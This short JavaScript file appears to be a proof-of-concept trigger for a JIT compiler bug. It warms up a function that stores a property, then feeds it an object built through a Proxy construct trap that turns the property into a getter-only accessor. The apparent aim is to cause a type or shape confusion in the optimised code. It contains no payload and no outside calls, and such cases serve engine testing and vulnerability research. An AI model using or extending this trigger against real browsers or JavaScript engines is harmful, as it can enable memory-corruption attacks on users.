let trigger_phase = false;
function VulnerableTarget() {
    if (trigger_phase) {
        const v5 = () => {
            return 0;
        };
        Object.defineProperty(this, "prop", { get: v5 });
        return;
    }
    this.prop = 1;
}
const v19 = {
    construct(a14, a15) {
        trigger_phase = true;
        return Reflect.construct(a14, a15);
    },
};
const v20 = new Proxy(VulnerableTarget, v19);
const P = v20;
function jit_func(a23) {
    a23.prop = 1.1;
}
for (let i26 = 0; i26 < 20000; i26++) {
    const v32 = new VulnerableTarget();
    let obj = v32;
    jit_func(obj);
}
const v35 = new P();
let trigger_obj = v35;
jit_func(trigger_obj);
